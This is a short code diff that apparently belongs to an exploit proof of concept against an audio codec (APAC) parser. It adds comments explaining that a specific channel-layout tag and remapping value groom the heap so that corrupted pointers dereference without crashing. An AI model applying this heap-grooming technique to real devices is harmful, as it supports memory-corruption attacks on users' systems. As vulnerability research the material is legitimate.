@@ -11,6 +11,12 @@ struct CodecConfig {
 };
 
 void OverrideApac(CodecConfig* config) {
+  //the exact tag given here is extremely important.
+  //The difference between the tag given here and the channelnum influences the heap layout.
+  //With these exact values, it almost always ends up such that the 13th pointer in the permuted input vector
+  //is the same address as the tenth one (i am not sure why yet, but the object that is there just happens to have that pointer as its first field perhaps). 
+  // This makes it so when the pointers are later dereferenced, there is no segfault.
+  //If you pick, for example, 13 and then 10 as the channelnum, it will segfault much earlier.
   config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 13;
   config->mRemappingArray.push_back(0x3);
 }
